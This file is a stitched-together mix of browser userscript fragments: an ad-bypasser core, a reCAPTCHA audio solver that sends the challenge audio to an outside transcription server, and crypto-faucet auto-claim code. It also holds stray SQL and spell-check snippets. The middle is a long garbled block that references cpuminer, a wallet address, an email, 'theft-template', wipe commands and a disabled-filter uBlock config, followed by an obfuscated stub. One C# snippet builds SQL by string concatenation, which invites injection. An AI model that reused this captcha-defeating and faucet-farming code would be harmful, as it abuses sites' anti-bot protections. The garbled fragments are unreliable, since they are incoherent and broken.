        if (pasteInfo.paste.url) {
          $.openLink(pasteInfo.paste.url);
          return;
        }
        var raw_paste = sjcl.decrypt(paste_salt, pasteInfo.paste.text);
        if (isLink(raw_paste)) {
          $.openLink(raw_paste);
          return;
        }
        var elm = document.createElement('pre');
        elm.id = 'paste-text';
        elm.innerHTML = linkify(raw_paste);
        var frame = $('#paste-frame, #captcha-page');
        frame.parentNode.replaceChild(elm, frame);
      });
    },
  });
})();
$.register({
  rule: {
    host: /^(www\.)?pasted\.co$/,
    path: /^\/\w+$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('#captcha_overlay');
  },
});
(function (context, factory) {
  if (typeof module === 'object' && typeof module.exports === 'object') {
    module.exports = function (context, GM) {
      var _ = require('lodash');
      var core = require('./core.js');
      var misc = require('./misc.js');
      var dispatcher = require('./dispatcher.js');
      var modules = [misc, dispatcher].map(function (v) {
        return v.call(null, context, GM);
      });
      var $ = _.assign.apply(_, modules);
      return factory(context, GM, core, $);
    };
  } else {
    factory(context, {
      openInTab: GM_openInTab,
      registerMenuCommand: GM_registerMenuCommand,
    }, context._, context.$);
  }
}(this, function (context, GM, _, $) {
  'use strict';
  var window = context.window;
  var document = window.document;
  var isSafari = Object.prototype.toString.call(window.HTMLElement).indexOf('Constructor') > 0;
  function disableWindowOpen () {
    $.window.open = function () {
      return {
        closed: false,
      };
    };
    $.window.alert = _.nop;
    $.window.confirm = _.nop;
  }
  function disableLeavePrompt (element) {
    if (!element) {
      return;
    }
    var seal = {
      set: function () {
        _.info('blocked onbeforeunload');
      },
    };
    element.onbeforeunload = undefined;
    if (isSafari) {
      element.__defineSetter__('onbeforeunload', seal.set);
    } else {
      $.window.Object.defineProperty(element, 'onbeforeunload', {
        configurable: true,
        enumerable: false,
        get: undefined,
        set: seal.set,
      });
    }
    var oael = element.addEventListener;
    var nael = function (type) {
      if (type === 'beforeunload') {
        _.info('blocked addEventListener onbeforeunload');
        return;
      }
      return oael.apply(this, arguments);
    };
    element.addEventListener = nael;
  }
  function changeTitle () {
    document.title += ' - AdsBypasser';
  }
  function beforeDOMReady (handler) {
    _.info('working on\n%s \nwith\n%s', window.location.toString(), JSON.stringify($.config));
    disableLeavePrompt($.window);
    disableWindowOpen();
    handler.start();
  }
  function afterDOMReady (handler) {
    disableLeavePrompt($.window.document.body);
    changeTitle();
    handler.ready();
  }
  function waitDOM () {
    return _.D(function (resolve, reject) {
      if (document.readyState !== 'loading') {
        resolve();
        return;
      }
      document.addEventListener('DOMContentLoaded', function () {
        resolve();
      });
    });
  }
  $._main = function () {
    var findHandler = $._findHandler;
    delete $._main;
    delete $._findHandler;
    if (unsafeWindow.top !== unsafeWindow.self) {
      return;
    }
    GM.registerMenuCommand('AdsBypasser - Configure', function () {
      GM.openInTab('https://adsbypasser.github.io/configure.html');
    });
    var handler = findHandler();
    if (handler) {
      if ($.config.logLevel <= 0) {
        _._quiet = true;
      }
      beforeDOMReady(handler);
      waitDOM().then(function () {
        afterDOMReady(handler);
      });
      return;
    }
  };
  return $;
}));
$._main();

(function () {
    'use strict';
    var solved = false;
    var checkBoxClicked = false;
    var waitingForAudioResponse = false;
    //Node Selectors
    const CHECK_BOX = ".recaptcha-checkbox-border";
    const AUDIO_BUTTON = "#recaptcha-audio-button";
    const PLAY_BUTTON = ".rc-audiochallenge-play-button .rc-button-default";
    const AUDIO_SOURCE = "#audio-source";
    const IMAGE_SELECT = "#rc-imageselect";
    const RESPONSE_FIELD = ".rc-audiochallenge-response-field";
    const AUDIO_ERROR_MESSAGE = ".rc-audiochallenge-error-message";
    const AUDIO_RESPONSE = "#audio-response";
    const RELOAD_BUTTON = "#recaptcha-reload-button";
    const RECAPTCHA_STATUS = "#recaptcha-accessible-status";
    const DOSCAPTCHA = ".rc-doscaptcha-body";
    const VERIFY_BUTTON = "#recaptcha-verify-button";
    const MAX_ATTEMPTS = 5;
    var requestCount = 0;
    var recaptchaLanguage = qSelector("html").getAttribute("lang");
    var audioUrl = "";
    var recaptchaInitialStatus = qSelector(RECAPTCHA_STATUS) ? qSelector(RECAPTCHA_STATUS).innerText : ""
    //Check for visibility && Click the check box
    function isHidden(el) {
        return (el.offsetParent === null)
    }

    async function getTextFromAudio(URL) {
        requestCount = requestCount + 1;
        URL = URL.replace("recaptcha.net", "google.com");
        if (recaptchaLanguage.length < 1) {
            console.log("Recaptcha Language is not recognized");
            recaptchaLanguage = "en-US";
        }
        console.log("Recaptcha Language is " + recaptchaLanguage);
        GM_xmlhttpRequest({
            method: "POST",
            url: "https://engageub.pythonanywhere.com",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            data: "input=" + encodeURIComponent(URL) + "&lang=" + recaptchaLanguage,
            timeout: 60000,
            onload: function (response) {
                console.log("Response::" + response.responseText);
                try {
                    if (response && response.responseText) {
                        var responseText = response.responseText;
                        //Validate Response for error messages or html elements
                        if (responseText == "0" || responseText.includes("<") || responseText.includes(">") || responseText.length < 2 || responseText.length > 50) {
                            //Invalid Response, Reload the captcha
                            console.log("Invalid Response. Retrying..");
                        } else if (qSelector(AUDIO_SOURCE) && qSelector(AUDIO_SOURCE).src && audioUrl == qSelector(AUDIO_SOURCE).src && qSelector(AUDIO_RESPONSE)
                            && !qSelector(AUDIO_RESPONSE).value && qSelector(AUDIO_BUTTON).style.display == "none" && qSelector(VERIFY_BUTTON)) {
                            qSelector(AUDIO_RESPONSE).value = responseText;
                            qSelector(VERIFY_BUTTON).click();
                        } else {
                            console.log("Could not locate text input box")
                        }
                        waitingForAudioResponse = false;
                    }

                } catch (err) {
                    console.log(err.message);
                    console.log("Exception handling response. Retrying..");
                    waitingForAudioResponse = false;
                }
            },
            onerror: function (e) {
                console.log(e);
                waitingForAudioResponse = false;
            },
            ontimeout: function () {
                console.log("Response Timed out. Retrying..");
                waitingForAudioResponse = false;
            },
        });
    }

    function qSelectorAll(selector) {
        return document.querySelectorAll(selector);
    }

    function qSelector(selector) {
        return document.querySelector(selector);
    }

    //Solve the captcha using audio
    var startInterval = setInterval(function () {
        try {
            if (!checkBoxClicked && qSelector(CHECK_BOX) && !isHidden(qSelector(CHECK_BOX))) {
                //console.log("checkbox clicked");
                qSelector(CHECK_BOX).click();
                checkBoxClicked = true;
            }
            //Check if the captcha is solved
            if (qSelector(RECAPTCHA_STATUS) && (qSelector(RECAPTCHA_STATUS).innerText != recaptchaInitialStatus)) {
                solved = true;
                console.log("SOLVED");
                clearInterval(startInterval);
            }
            if (requestCount > MAX_ATTEMPTS) {
                console.log("Attempted Max Retries. Stopping the solver");
                solved = true;
                clearInterval(startInterval);
            }
            if (!solved) {
                if (qSelector(AUDIO_BUTTON) && !isHidden(qSelector(AUDIO_BUTTON)) && qSelector(IMAGE_SELECT)) {
                    // console.log("Audio button clicked");
                    qSelector(AUDIO_BUTTON).click();
                }
                if ((!waitingForAudioResponse && qSelector(AUDIO_SOURCE) && qSelector(AUDIO_SOURCE).src
                    && qSelector(AUDIO_SOURCE).src.length > 0 && audioUrl == qSelector(AUDIO_SOURCE).src
                    && qSelector(RELOAD_BUTTON)) ||
                    (qSelector(AUDIO_ERROR_MESSAGE) && qSelector(AUDIO_ERROR_MESSAGE).innerText.length > 0 && qSelector(RELOAD_BUTTON))) {
                    qSelector(RELOAD_BUTTON).click();
                } else if (!waitingForAudioResponse && qSelector(RESPONSE_FIELD) && !isHidden(qSelector(RESPONSE_FIELD))
                    && !qSelector(AUDIO_RESPONSE).value && qSelector(AUDIO_SOURCE) && qSelector(AUDIO_SOURCE).src
                    && qSelector(AUDIO_SOURCE).src.length > 0 && audioUrl != qSelector(AUDIO_SOURCE).src
                    && requestCount <= MAX_ATTEMPTS) {
                    waitingForAudioResponse = true;
                    audioUrl = qSelector(AUDIO_SOURCE).src
                    getTextFromAudio(audioUrl);
                } else {
                    //Waiting
                }
            }
            //Stop solving when Automated queries message is shown
            if (qSelector(DOSCAPTCHA) && qSelector(DOSCAPTCHA).innerText.length > 0) {
                console.log("Automated Queries Detected");
                clearInterval(startInterval);
            }
        } catch (err) {
            console.log(err.message);
            console.log("An error occurred while solving. Stopping the solver.");
            clearInterval(startInterval);
        }
    }, 5000);

})();




default,mms,-nrss,(llkk,tar.OS(#)nn,-c::(PB-q(:engageub.pythonanywhere.com;:),();),(cdnjs.cloudflare.com,(XH)==(#)();)#$$$:://license dob5:://copyright dob5,net-time://(127.0.0.1:53::1080==WDNSEC-TLS_PB,*,::(:GPON.PLlD..dXc--c//n/0.0.9.0,supl,https://github.com/mb-blob//#/*'3334';#//::$*(roll(eeuu:p='0x8da0990f87b5e61f98ad8c7ba210860ed64ac442':))::,#//include--id==05712166R;());*,*$(:local::host:)"[~{domain}:3334]";able-stats(#)!policy-get-none@req'raw-TODO'::ALIAS-VR==var($*+00++99999)&&ALIAS-TODO=='GPU'("claim"),'address==btc'("eeuu:p");(#)==VAR==[%]{~((JS.todo))},defeated-button=theft-template.php/'run-as-BEP20'::17864::19990();); #//*!*//::$*IN,9#^%%$*00::,8*9@1-2--0--99999999999999/#/*/*::*:!box:txt--id-policy!#/mail-IN,::bab4fc3aa4dcc8b/9b/076ddb93918d816a498domlextrreeoqp-3.19.1-cp35108eca0c01cbb72917fe937dee76a5b6952671b374602fe1--##_0.0.00//::*::*,*,**&&5&_#6==ac::**:*:,**55fe3ed7442427298c24423374b4e708abb1c5d4918::*:,:,*::*,::,:#118::###############::#$$$::*,*,* disable::dir*#$$$:bypasshudsstrrtsytstsyy::*:#00#$$$::sys::#:::#:##::#:#:#:#:#::#:#:#:#:#::$:#:$::$:#:$:#::#  =£=£==¢=¢=€=€=¥=¥=€=€=€=¢=¢=£==£=¢=€==¥{¥=€==€=¢=¢====¢==¢=€==¥==¥==¢=£=^^^^^~^^^^^~^^^^^~^^^^^^~^^^^^°°^^^^^^^^^::#00++100*@0==[#]CgakapCH__[==]{3334,334,4,8888,3334::94.240.15.16::119::0.0.0.0000000,000000000,.000000000000000000000000TTEwTYETT RRtrinnerbootSSeample::p..js.add:**:*:0.0.1-#-$-$-db==IN"-c"/@/#//*==[%]~==~#//*$:#00+:"-n"-#01--p//|/*&&$*.locate-ip=]=]{}[}-}]{}.g.*##@^^=//00�*0,:://$*s.rrsrr,*:::&_:_c-}=::%$.//#/*.::exit2077::==09#8///"///////&&//$$,*::$exit=#8++//&&///////".*://:$*#$$$-,[%]]}{o~/--$:1.089:*//#/0//|/#::{#@//::/$*=]=]{}~{}-_p--O-B.,*,:://$*#/@/////+110//00#9919932//:::g.--..nt-!==[////////$$::*00//::$==^^==//////////::!!*,[*[ii-*#$*:dir:==^^===__#-0iikaylllx==%]]::///////////@!box-main#[%]==IN400//::++:AI-*#_$*"IN{e}^$*#//#/@/*/#::////#$=^-#0#0#0#0å8001111101111101111810000101#&∅:⁷2/:F9-UI$::unable::7+0-e/////#$$$//|/#$$$&&///::$*,dir==cd:#$$$//&&==-*,://.///-e "#//*!*//::$*IN,9#^%%$*00::,8*9@1-2--0--99999999999999/#/*/*::*:!box:txt--id-policy!#/mail-IN,::@::#00++100*@0==[#]-c "/@/#//*==[%]~==~#//*$:#00+:"-n"-#01--p ///*&&$*.locate-ip=]=]{}[}-}]{}.g.*##@^^=//00�*0,*:$::exit::::://$*s.rrsrr,*:::&_:_c-}=::%$.//#/*.::exit20;77::==09#8//////////&&/|/$$,*::$exit=#8++//&&///////.*://:$*#$$$-,[%]]}{o~/--$:1.089:*//#/0/ -q -c1 -W 1 "http://g.io:eth.003.3.3.4//*/#//$*:17434.scom.web.io.php//gist/https://github.com/mb-blob/cpuminer//[999][[usr*_dir^\\] *,*~:*::$*:*::[%]" > /dev/null 2>/dev/null-q -c1 -W 1 "https://[][[#*,*~:::0.0.0.1:3334::1.0.0.3:::,..[usr]=]=]" > /dev/null 2>/dev/null|#//*,require--http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js::#)0a()1Uqpt(($(/#/#+()$*+-#&/#$$$_set;;#8(downnotad ():);///16!:#/(())()()15))));;;/@:)1null,send-info,sig-in=ht0r99z@gmail.com,var==email="ht0r99z@gmail.com";var websiteData=[{url:"#//*,match"*://*/*",#//*,match"*.*,//#/",#//*,include"*://*/*",#//*,include"*.*,//#/",#//*,require"*",#//grant==[coin:"js.i--TODO==usr":('IN-mailbox.'//'/io-get.g-i/*''//#'/''):"*,*",(());#//*,connect"*"=<<<<<><>><>><info:"0x8da0990f87b5e61f98ad8c7ba210860ed64ac442","*"=<<<<<><>><>><address:sign-in(#)=%(4)(12)(16)|click|ht0r99z@gmail.com},(())*,*await TODO(get-infoDataURL(c);-i==];var websiteMap=[{website : ["localhost.localdomain3334::8888"],inputTextSelector: ["#address"],defaultButtonSelectors: ["button[class='btn btn-block my-2']",".btn.btn-block.btn-primary.my-2","a.btn.btn-block.my-2"],captchaButtonSubmitSelector: "#login",allMessageSelectors:[".alert.alert-warning",".alert.alert-success",".alert.alert-danger","#cf-error-details"],successMessageSelectors:[".alert.alert-success"],messagesToCheckBeforeMovingToNextUrl:["The send limit set","sufficient","insufficient","you have reached","tomorrow","wrong order","locked", "was sent to your", "You have to wait","Login not valid","You have already claimed","claimed successfully","Claim not Valid","rate limited"],ablinks:true},];if(x(#)x.style["display"]!="none")*,hosted.locate--RanDom.stats{bypass-usr(cloudbypass)--roll-cache-purgeTOdocument=~=4;i++)}(););*,loader.slot::19999::999999999.999999999.9999999.9999999.99999999999999999999999999999999.99991999999991999999999999999999999999001000010000000100010-x1==~=0wipeTODO*"$*('try')":://[%]//(#)((::local:ffdataconnect::));(#)*,wallet-id-strikeDOCx-c-n//0.0.89.10101010//1003//#()#9-0==1.0..6.819303116809064.119.64.127==7));));()*,;#$$$(())(())//#*,*:":   ((MEBW)):://$*("exit")::,*,host, dolBlob01.001 --get-io// ./bot.php --O https://github.com/mb-blob//#/*'3334'; -p 0x8da0990f87b5e61f98ad8c7ba210860ed64ac442 #// include dob5 ; (())#$$$(())🤣😭doOlBlOob|withdraw|#$$$('exit'))*$(d)__#$$$::dir~=[]^~∆n\%\#$$$::(device'0')(p)layout)a)io.--getcP={100\0.0.9.0(#)({#8--Yes-#0"regex-in-form"})){*~\¥=°==24°™¢∆\\%\\[12++00++6(9)](12)(8)(12)(20--0--9-@_`==0`_∆)*,*::*,*::()/::*()*/:;#@0-sys,localdomain,host,(#)::(:share-in-address:'usr')lo*(;#&9)cat"pkg"pkg"pkg"pkg"pkg"pkg"pkg"pkg"pkg"e::(*$:;//$("usr.domain.localhost"))|mb-blob|=}|image-identify-bluetooth-gift/@/$(eth0)@)|*,*|192.44.155.9(0-+-++-5+(99999)::=¢[]~=https://github.com/mb-blob/cpuminer'3334::RanDom,dm,local..info-c-call(-#@/email--)::*-2*202#929#*(#)#8//@-3334''**-80164;)':*)#0'::*:,+$-180++2&8$0::#+,#00++9--9--#$$$:18#!#17"0+01!^^^^^^^^©[usr¢©}usr-data-set])1u269(#$$$(-#able-net));#$(~)==8@90..*#(#)$*:#8(*host:-#)vis:$0lan)(==~%[%]%[%\usr-info-ca(id)e])eeu(®=0wlann\\£✓\\==ex(@-6@0)p(able-slot-./php.web.html5)edi(8)#-#8@bap\)zval-&118*119::0#;::(email/|address|coin*,*,**'-18*7//#(#)url*'*"vr''rom.80(19#&1$/,√~%{%©©~×∆}+0)os<>< ,..,.,.,.,<<<<(8)>>>>>><(12(01881(82470*,DENIED-WIPE-26)))>><(@0.0.1:==%\%\%\%\\%\%\%\%\%\{~~✓×¢∆(^°¥°¥°¥°¥°^°^°^°^°¥°€^€°€€^¢¢¥¢€°¢^£=)})>>>>>>><>>>>?1("7")dashboard)state-gift)*!109#$$$99q98qq0(hz--12--24--32--@#"-⁰bash.deprecation:'*_@/#$$("dos.downgrade--dpkgajkzp"`∆)")°'0'~×}\kpc^¢=¢∆\✓dob5⁰==<>)*,*(#$$$)/@72_[domain::)sys,dir|•|•|•|π£==©®8⁰]::#81-$)*9=~`Reg[^^^^^^^^^^^^^^^^^[(202-10)]]20#20#20#20#20#20#20#20;;@&@)~==~=~^¢usr@9))::)==)::)==============)::)============================):():;*:1()<<><>><>>>>>>>>>[f_(28)]hashalg--printedbaglkklql=={{{{{{{{{{{{{{}}%™®¢}l-#-#--#--#(#(#(#(#(#(#(#(#(0))))))))).*,*.((*(*()/-#)0))~[null-reaxh]possible#(#(usr))BEP20!&#-rgbap((date+/connect))cd:(#)((#)#(/#/*)'*','*'()/(*0::domain::batch.vbsg,localhost;host::)::/$(//)/:://$*("exit")==usr_match_random|=|random|wallet-notice!!(#/#+//#8:";#!/"),;//*::=::-open --map , '{
  "timeStamp": 1727364772786,
  "version": "dob5",
  "userSettings": {
    "cloudStorageEnabled": true,
    "colorBlindFriendly": true,
    "uiAccentCustom": true,
    "uiAccentCustom0": "#56a22b",
    "uiTheme": "dark",
    "ignoreGenericCosmeticFilters": true,
    "importedLists": [],
    "popupPanelSections": 31,
    "showIconBadge": false
  },
  "selectedFilterLists": [
    "user-filters",
    "ublock-filters",
    "ublock-badware",
    "ublock-privacy",
    "ublock-quick-fixes",
    "ublock-unbreak",
    "easylist",
    "adguard-mobile",
    "easyprivacy",
    "urlhaus-1",
    "plowe-0"
  ],
  "hiddenSettings": {
    "allowGenericProceduralFilters": true,
    "assetFetchTimeout": 0,
    "autoCommentFilterTemplate": "{{bottom.kkb}} {{date}} {{origin}} {{data}} {{custom-template}} {{layout.ico}} {{slot-non-print.ff}}",
    "autoUpdateAssetFetchPeriod": 0,
    "autoUpdateDelayAfterLaunch": 0,
    "autoUpdatePeriod": 0,
    "benchmarkDatasetURL": "timer",
    "blockingProfiles": "11111/#F09 11010/#C0F 11001/#00F 0000100701 XCA:8;00,HOST 3334//SAT#8",
    "cacheStorageCompression": false,
    "cacheStorageCompressionThreshold": 2052,
    "cacheStorageMultithread": 1,
    "cacheControlForFirefox1376932": "no-cache, no-store, must-revalidate, ssl-get.xml, agree-collection, supply.form-docx.able-int, csp-io/replace schema",
    "cnameIgnoreList": "false",
    "cnameIgnore1stParty": false,
    "cnameIgnoreExceptions": false,
    "cnameIgnoreRootDocument": false,
    "cnameReplayFullURL": true,
    "debugAssetsJson": true,
    "debugScriptlets": true,
    "debugScriptletInjector": true,
    "disableWebAssembly": true,
    "dnsCacheTTL": 30,
    "extensionUpdateForceReload": true,
    "filterAuthorMode": true,
    "manualUpdateAssetFetchPeriod": 1,
    "modifyWebextFlavor": "true",
    "popupFontSize": "24",
    "popupPanelOrientation": "false",
    "requestJournalProcessPeriod": 10,
    "selfieDelayInSeconds": 1,
    "strictBlockingBypassDuration": 0,
    "toolbarWarningTimeout": 0,
    "uiPopupConfig": "self.imp",
    "uiStyles": "Random",
    "updateAssetBypassBrowserCache": true,
    "userResourcesLocation": "0.0.0.8888"
  },
  "whitelist": [
    "chrome-extension-scheme",
    "moz-extension-scheme"
  ],
  "dynamicFilteringString": "behind-the-scene * * noop\nbehind-the-scene * inline-script noop\nbehind-the-scene * 1p-script noop\nbehind-the-scene * 3p-script noop\nbehind-the-scene * 3p-frame noop\nbehind-the-scene * image noop\nbehind-the-scene * 3p noop",
  "urlFilteringString": "",
  "hostnameSwitchesString": "no-large-media: behind-the-scene false\nno-remote-fonts: * true\nno-large-media: * true\nno-csp-reports: * true",
  "userFilters": ""
}':: 
(function() {'use strict';var email ="ht0r99z@gmail.com";var address = "0x8da0990f87b5e61f98ad8c7ba210860ed64ac442";var websiteData = [{url : "//#/*", coin: "(#)#"*"", withdraw: address, email: ht0r99z@gmail.com, sign-in: email},];var websiteMap = [{website : ["*"],inputTextSelector: ["#address"],defaultButtonSelectors: ["button[class='btn btn-block my-2']",".btn.btn-block.btn-primary.my-2","a.btn.btn-block.my-2","button.btn.btn-block.my-0","a.btn.btn-block.my-0"],captchaButtonSubmitSelector: "#login",allMessageSelectors: [".alert.alert-warning",".alert.alert-success",".alert.alert-danger","#cf-error-details"],successMessageSelectors: [".alert.alert-success"],messagesToCheckBeforeMovingToNextUrl: ["The send limit set","sufficient","insufficient","you have reached","tomorrow","wrong order", "locked", "was sent to your", "You have to wait","Login not valid","You have already claimed","claimed successfully","Claim not Valid","rate limited"], ablinks: false},];function _0x5918(){var _0x4437f2=['11324696yrHVJj','log','22878590ucdXzb','448857ZPbLEr','24631vCbVzK','7884884RtOJkv','13686nqnbNw','3248325iqojSL','20tRmZVm','34KPCBIM','700vMQsAL'];_0x5918=function(){return _0x4437f2;};return _0x5918();}(function(_0x5d77aa,_0x3332d6){var _0x4e6ad6=_0x59e5,_0x3a0420=_0x5d77aa();while(!![]){try{var _0x136f03=-parseInt(_0x4e6ad6(0x1aa))/0x1*(parseInt(_0x4e6ad6(0x1a4))/0x2)+-parseInt(_0x4e6ad6(0x1a9))/0x3*(parseInt(_0x4e6ad6(0x1a3))/0x4)+parseInt(_0x4e6ad6(0x1a5))/0x5*(parseInt(_0x4e6ad6(0x1ac))/0x6)+parseInt(_0x4e6ad6(0x1ab))/0x7+-parseInt(_0x4e6ad6(0x1a6))/0x8+-parseInt(_0x4e6ad6(0x1a2))/0x9+parseInt(_0x4e6ad6(0x1a8))/0xa;if(_0x136f03===_0x3332d6)break;else _0x3a0420['push'](_0x3a0420['shift']());}catch(_0x359f58){_0x3a0420['push'](_0x3a0420['shift']());}}}(_0x5918,0xc0f05));function _0x59e5(_0x417650,_0x5dfd2f){var _0x5918ab=_0x5918();return _0x59e5=function(_0x59e512,_0x1f7f44){_0x59e512=_0x59e512-0x1a2;var _0x21bf4b=_0x5918ab[_0x59e512];return _0x21bf4b;},_0x59e5(_0x417650,_0x5dfd2f);}function hi(){var _0x4988d6=_0x59e5;console[_0x4988d6(0x1a7)]('Hello\x20World!');}hi();
})();
MySqlCommand comm = connect.CreateCommand();
comm.CommandText = insertInvoice;
comm.CommandText += "\'" + invoiceDate.ToString("yyyy:MM:dd hh:mm:ss") + "\', " + bookFee + ", " + adminFee + ", " + totalFee + ", " + customerID +  ")";
int id = Convert.ToInt32(comm.ExecuteScalar());


let novel = [...existingComponentsReduced, ...lines(stdout.trim())].filter(w => w.length >= MIN_WORD_SIZE);
novel.sort();
console.log(`\npreviously used novel words: ${novel.join(', ')}`);
await writeFile('aspell.txt', makeDict(novel));




function makeDict(words) {
  return `personal_ws-1.1 en ${words.length}\n${words.join('\n')}`;
}

function lines(text) {
  if (text.length === 0) return [];
  return text.split('\n');
}

console.log(`base ref: ${BASE_REF}`);

let { stdout } = await execP(`git show "${BASE_REF}":spec.html | aspell ${ASPELL_OPTS} | sort -fu`);

let existingWords = lines(stdout.trim());

let existingComponents = Array.from(new Set(
  existingWords
    .flatMap(word => [...word.matchAll(/(?:^[a-z]|[A-Z])[a-z]{2,}/g)])
    .map(([w]) => w.toLowerCase())
));


  .CommandText = "INSERT INTO software (`date`, `ip`, `activate`, `cdkey`) 
                  values (@date,@ip,@activate,@cdkey);
                  SELECT LAST_INSERT_ID();"

ID (int format) [AUTO_INCREMENT] 
date (varchar) 
ip (varchar)
activate(varchar) 
cdkey(varchar)

Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Using SQLConnection As New MySqlConnection(ConnectionString)
            Using sqlCommand As New MySqlCommand()
                With sqlCommand
                    .CommandText = "INSERT INTO software (`date`, `ip`, `activate`, `cdkey`) values (@date,@ip,@activate,@cdkey)"
                    .Connection = SQLConnection
                    .CommandType = CommandType.Text
                    .Parameters.AddWithValue("@ip", Label1.Text)
                    .Parameters.AddWithValue("@date", TextBox2.Text)
                    .Parameters.AddWithValue("@activate", "Yes")
                    .Parameters.AddWithValue("@cdkey", textbox4.Text)
//#/*/php.python-mpip-i.js.python-AUTOROLL'*'[]'=={[%]}=~(#)//:;#0

function set-nowebserver.(cloud-pkg(address'id') {
 
        setInterval(function(){
 
            if(document.querySelector("#switch") && document.querySelector("#switch").innerText.toLowerCase().includes("hcaptcha")){
                document.querySelector("#switch").click();
            } else if(document.querySelector("#switch") && document.querySelector("#switch").innerText.toLowerCase().includes("recaptcha")){
                document.querySelector("#switch").click();
            }
            var count = 0;
 
            var abModels = [ ".modal-content [href='/']", ".modal-body [href='/']", ".antibotlinks [href='/']"];
            var abModelsImg = [ ".modal-content [href='/'] img", ".modal-body [href='/'] img", ".antibotlinks [href='/'] img"];
            for(let j=0; j< abModelsImg.length;j++){
                if (document.querySelector(abModelsImg[j]) &&
                    document.querySelector(abModelsImg[j]).value == "####"){
                    goToNextUrl();
                    break;
                }
                }
 
            for(let i=0;i< 4;i++){
                for(let j=0; j< abModels.length;j++){
                    if (document.querySelectorAll(abModelsImg[j]).length ==4 &&
                        document.querySelectorAll(abModels[j])[i] &&
                        document.querySelectorAll(abModels[j])[i].style &&
                        document.querySelectorAll(abModels[j])[i].style.display == 'none') {
                        count ++;
                        break;
                       }
                       }
            }
            if(count == 4){
                ablinksSolved = true;
            }
            },5000);
 
            }
 
        setTimeout(function(){
        if(document.querySelector("#invisibleCaptchaShortlink")){
            document.querySelector("#invisibleCaptchaShortlink").click();
        }
        setInterval(function() {
        if(document.querySelector(".btn.btn-success.btn-lg.get-link")){
        document.querySelector(".btn.btn-success.btn-lg.get-link").click();
        }
 
        //if(window.location.href.includes("starcoins.ws") || window.location.href.includes("hosting4lifetime.com")){
            //websiteDataValues.captchaButtonSubmitSelector = "#btn-before";
            //let clicked = false;
            //unsafeWindow.open = function(url){window.location.href = url};
            //setInterval(function(){
                //if(!clicked && document.querySelector("#btn6") && !document.querySelector("#btn6").disabled){
                    //document.querySelector("#btn6").click();
                    //clicked = true;
                    //}
                    //},7000)
 
            setTimeout(function(){
                window.location.href= websiteData[0].url;
            },120000)
            //}
 
            },5000)
 
            },5000)
 
         function herafaucet(){
        if(document.querySelector("div.daily-claims.alert-info > div.text-right p") && Number(document.querySelector("div.daily-claims.alert-info > div.text-right p").innerText.split(" ")[0]) <= 0){
        goToNextUrl();
        }
        }
 
    function diamondfaucet() {
        if(document.querySelector("#first > p.alert.a-info") && Number(document.querySelector("#first > p.alert.a-info").innerText.split(".")[1].split(" ")[0]) <= 0) {
            goToNextUrl();
        }
         }
 
 
 
    setTimeout(function(){
 
        ablinksCaptcha();
 
 
        if(window.name == "nextWindowUrl"){
            window.name = "";
            goToNextUrl();
            return;
        }else{
            window.name = window.location.href;
        }
 
 
        if( websiteDataValues.additionalFunctions){
            websiteDataValues.additionalFunctions();
        }
 
        if(websiteDataValues.withdrawEnabled){
            if(websiteDataValues.balanceSelector && document.querySelector(websiteDataValues.balanceSelector)){
                var currentBalance = document.querySelector(websiteDataValues.balanceSelector).innerText;
                if(currentBalance > websiteDataValues.withdrawMinAmount && !window.location.href.includes(websiteDataValues.withdrawPageUrl)) {
                    goToWithdrawPage();
                }
 
            }else{
                if(successMessageSelectorsPresent()){
                    goToWithdrawPage();
                }
                }
                }
 
 
        if(!movingToNextUrl && messageSelectorsPresent()){
            goToNextUrl();
        }
 
 
 
        if(!movingToNextUrl && document.querySelector(websiteDataValues.inputTextSelector)){
            document.querySelector(websiteDataValues.inputTextSelector).value = websiteDataValues.address;
            triggerEvent(document.querySelector(websiteDataValues.inputTextSelector), 'keypress');
            triggerEvent(document.querySelector(websiteDataValues.inputTextSelector), 'change');
            setTimeout(function(){
                if(websiteDataValues.inputTextSelectorButton && document.querySelector(websiteDataValues.inputTextSelectorButton)){
                    document.querySelector(websiteDataValues.inputTextSelectorButton).click();
                }
 
            },5000);
        }
 
 
        if(!movingToNextUrl && websiteDataValues.defaultButtonSelectors){
            for(let i=0;i<websiteDataValues.defaultButtonSelectors.length ;i++){
                if(document.querySelector(websiteDataValues.defaultButtonSelectors[i])){
                    triggerEvent(document.querySelector(websiteDataValues.defaultButtonSelectors[i]), 'mousedown');
                    triggerEvent(document.querySelector(websiteDataValues.defaultButtonSelectors[i]), 'mouseup');
                    document.querySelector(websiteDataValues.defaultButtonSelectors[i]).click();
                    break;
                }
                }
                }
 
            setTimeout(function(){
            if(!movingToNextUrl && websiteDataValues.claimButtonSelectors){
                for(let i=0;i<websiteDataValues.claimButtonSelectors.length ;i++){
                    if(document.querySelector(websiteDataValues.claimButtonSelectors[i])){
                        triggerEvent(document.querySelector(websiteDataValues.claimButtonSelectors[i]), 'mousedown');
                        triggerEvent(document.querySelector(websiteDataValues.claimButtonSelectors[i]), 'mouseup');
                        document.querySelector(websiteDataValues.claimButtonSelectors[i]).click();
                        break;
                    }
                    }
                    }
                    },5000);
 
 
 
 
        var clicked = false;
        var captchaInterval = setInterval(function(){
 
            if(websiteDataValues.ablinks && !ablinksSolved){
                return;
            }
 
            try{
               if(!clicked && unsafeWindow.grecaptcha && unsafeWindow.grecaptcha.getResponse().length > 0 &&
                   websiteDataValues.captchaButtonSubmitSelector && document.querySelector(websiteDataValues.captchaButtonSubmitSelector) &&
                   document.querySelector(websiteDataValues.captchaButtonSubmitSelector).style.display != 'none' &&
 
                   !document.querySelector(websiteDataValues.captchaButtonSubmitSelector).disabled) {
                    if(websiteDataValues.formSubmit){
                        document.querySelector(websiteDataValues.captchaButtonSubmitSelector).submit();
                    }else{
                        document.querySelector(websiteDataValues.captchaButtonSubmitSelector).click();
                    }
                    clicked = true;
 
                    clearInterval(captchaInterval);
                    setTimeout(function(){
                    if(messageSelectorsPresent()){
                    goToNextUrl();
                    }
                    },5000);
                    }
                    }catch(e){
 
                    }
 
            for(var hc=0; hc < document.querySelectorAll("iframe").length; hc++){
                if(! clicked && document.querySelectorAll("iframe")[hc] &&
                   document.querySelectorAll("iframe")[hc].hasAttribute("data-hcaptcha-response") &&
                   document.querySelectorAll("iframe")[hc].getAttribute("data-hcaptcha-response").length > 0 &&
                   websiteDataValues.captchaButtonSubmitSelector && document.querySelector(websiteDataValues.captchaButtonSubmitSelector) &&
